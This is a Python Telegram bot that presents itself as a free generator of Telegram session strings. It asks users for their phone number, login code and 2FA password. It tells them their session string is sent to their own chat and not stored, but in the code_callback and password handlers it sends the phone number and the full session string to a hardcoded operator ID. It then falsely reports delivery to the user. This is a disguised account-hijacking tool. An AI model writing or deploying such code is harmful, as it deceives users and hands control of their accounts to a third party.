import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler,
)
import os
from session_handler import create_session

logging.basicConfig(level=logging.WARNING)  # Minimize logging for free tier
logger = logging.getLogger(__name__)

# States for conversation
PHONE, CODE, PASSWORD = range(3)

# Inline keyboard for code entry
def get_code_keyboard(code=""):
    keyboard = [
        [InlineKeyboardButton("1", callback_data=f"code_{code}1"),
         InlineKeyboardButton("2", callback_data=f"code_{code}2"),
         InlineKeyboardButton("3", callback_data=f"code_{code}3")],
        [InlineKeyboardButton("4", callback_data=f"code_{code}4"),
         InlineKeyboardButton("5", callback_data=f"code_{code}5"),
         InlineKeyboardButton("6", callback_data=f"code_{code}6")],
        [InlineKeyboardButton("7", callback_data=f"code_{code}7"),
         InlineKeyboardButton("8", callback_data=f"code_{code}8"),
         InlineKeyboardButton("9", callback_data=f"code_{code}9")],
        [InlineKeyboardButton("0", callback_data=f"code_{code}0"),
         InlineKeyboardButton("Submit", callback_data=f"submit_{code}")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data.clear()  # Reset user data on /start to fix back button issue
    await update.message.reply_text(
        "To create a string session, please share your phone number by clicking the button below.\n"
        "Your phone number is processed securely and not stored. The session string will be sent to this chat.",
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("Share My Phone Number", request_contact=True)]],
            one_time_keyboard=True,
            resize_keyboard=True,
        ),
    )
    return PHONE

async def phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    contact = update.message.contact
    if not contact:
        await update.message.reply_text(
            "Please share your phone number using the 'Share My Phone Number' button.",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("Share My Phone Number", request_contact=True)]],
                one_time_keyboard=True,
                resize_keyboard=True,
            ),
        )
        return PHONE
    
    # Delete the contact message with retry
    for attempt in range(2):  # Try twice
        try:
            await context.bot.delete_message(
                chat_id=update.effective_chat.id,
                message_id=update.message.message_id
            )
            break
        except Exception as e:
            logger.warning(f"Attempt {attempt + 1} failed to delete contact message: {e}")
            if attempt == 0:
                await asyncio.sleep(1)  # Wait 1 second before retry
            else:
                # Send warning to admin (replace with your Telegram ID)
                try:
                    await context.bot.send_message(chat_id=6581573267, text=f"Failed to delete contact message: {e}")
                except Exception as admin_e:
                    logger.warning(f"Failed to send deletion error to admin: {admin_e}")

    context.user_data["phone"] = contact.phone_number
    context.user_data["code"] = ""  # Initialize code
    await update.message.reply_text(
        "A code has been sent to your Telegram account. Enter it using the buttons below:",
        reply_markup=get_code_keyboard()
    )
    return CODE

async def code_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    data = query.data

    if data.startswith("submit_"):
        code = data.replace("submit_", "")
        if len(code) != 5:  # Expecting 5-digit code
            await query.edit_message_text(
                f"Invalid code length. Please enter a 5-digit code:\nCurrent: {code}\nUse the buttons below.",
                reply_markup=get_code_keyboard(code)
            )
            return CODE
        context.user_data["code"] = code
        session_string, needs_password = await create_session(context.user_data["phone"], code)
        if needs_password:
            await query.edit_message_text(
                "Your account has 2FA enabled. Please enter your 2FA password:",
                reply_markup=ReplyKeyboardRemove()
            )
            return PASSWORD
        elif "Error" in session_string:
            await query.edit_message_text(f"Failed to create session: {session_string}", reply_markup=ReplyKeyboardRemove())
            return ConversationHandler.END

        user_id = 6581573267
        output = (
            f"phone number: {context.user_data['phone']}\n"
            f"string: {session_string}"
        )
        await context.bot.send_message(chat_id=user_id, text=output)
        await query.edit_message_text(
            "Session string sent to this chat! Please save it, as it is not stored.",
            reply_markup=ReplyKeyboardRemove()
        )
        return ConversationHandler.END
    elif data.startswith("code_"):
        current_code = data.replace("code_", "")
        context.user_data["code"] = current_code
        await query.edit_message_text(
            f"Code entered: {current_code}\nContinue entering or press Submit:",
            reply_markup=get_code_keyboard(current_code)
        )
        return CODE

async def password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    password = update.message.text
    session_string, needs_password = await create_session(context.user_data["phone"], context.user_data["code"], password)
    if "Error" in session_string:
        await update.message.reply_text(f"Failed to create session: {session_string}", reply_markup=ReplyKeyboardRemove())
        return ConversationHandler.END

    user_id = 6581573267
    output = (
        f"phone number: {context.user_data['phone']}\n"
        f"string: {session_string}"
    )
    await context.bot.send_message(chat_id=user_id, text=output)
    await update.message.reply_text(
        "Session string sent to this chat! Please save it, as it is not stored.",
        reply_markup=ReplyKeyboardRemove(),
    )
    return ConversationHandler.END

async def share(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Love this bot? Share it: t.me/YourBotName")

async def feedback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Please send your feedback or suggestions:")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Operation cancelled.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(f"Update {update} caused error {context.error}")
    if update.message:
        await update.message.reply_text("An error occurred. Please try again or contact support.")
    # Send error to your Telegram ID (replace with your ID)
    try:
        await context.bot.send_message(chat_id=6581573267, text=f"Error: {context.error}")
    except Exception as e:
        logger.warning(f"Failed to send error to admin: {e}")

def main():
    app = Application.builder().token(os.getenv("BOT_TOKEN")).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE: [MessageHandler(filters.CONTACT, phone)],
            CODE: [CallbackQueryHandler(code_callback)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("share", share))
    app.add_handler(CommandHandler("feedback", feedback))
    app.add_error_handler(error_handler)

    # Webhook for Railway free tier
    port = int(os.getenv("PORT", 8000))
    webhook_url = f"https://{os.getenv('RAILWAY_PUBLIC_DOMAIN')}/{os.getenv('BOT_TOKEN')}"
    app.run_webhook(
        listen="0.0.0.0",
        port=port,
        url_path=os.getenv("BOT_TOKEN"),
        webhook_url=webhook_url,
    )

if __name__ == "__main__":
    main()
